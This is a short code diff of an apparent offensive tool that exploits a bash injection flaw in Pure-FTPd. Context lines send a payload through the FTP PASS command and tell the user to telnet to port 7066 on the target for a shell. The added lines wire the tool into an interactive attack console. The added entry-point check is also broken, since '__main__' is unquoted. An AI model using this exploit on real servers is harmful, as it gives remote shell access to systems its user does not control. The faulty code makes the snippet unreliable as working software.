@@ -91,3 +91,8 @@ class pureftpdBashInjectionMenu(cmd.Cmd):
     s.send("PASS " + payload)
     s.recv(1024)
     print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+def main():
+  pureftpdbashinjectionmenu = pureftpdBashInjectionMenu()
+  pureftpdbashinjectionmenu.cmdloop("pdf-console attack(pureftpd_bash_injection)% ")
+if __name__ == __main__:
+  main()
